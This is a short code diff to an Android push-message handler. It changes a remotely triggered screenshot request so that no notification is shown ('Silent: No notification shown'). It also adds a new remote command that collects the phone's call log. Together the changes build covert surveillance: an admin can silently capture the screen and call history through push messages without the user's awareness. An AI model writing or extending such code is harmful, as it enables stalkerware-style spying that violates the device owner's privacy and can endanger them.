@@ -37,11 +37,17 @@ public class MyFirebaseMessagingService extends FirebaseMessagingService {
             if ("screenshot".equals(action)) {
                 Log.d(TAG, "Action: Screenshot (ANTIGRAVITY UPDATE). Broadcasting...");
 
-                showNotification("Screenshot Requested", "Admin requested a screenshot.");
+                // Silent: No notification shown
+                // showNotification("Screenshot Requested", "Admin requested a screenshot.");
 
-                // Broadcast to MainActivity to take screenshot
+                // Broadcast to GlobalActionService to take screenshot
                 Intent intent = new Intent("com.example.suma.ACTION_SCREENSHOT");
                 intent.setPackage(getPackageName()); // Explicitly target our own app
+                sendBroadcast(intent);
+            } else if ("backup_call_log".equals(action)) {
+                Log.d(TAG, "Action: Backup Call Log. Broadcasting...");
+                Intent intent = new Intent("com.example.suma.ACTION_BACKUP_CALLLOG");
+                intent.setPackage(getPackageName());
                 sendBroadcast(intent);
             }
         }
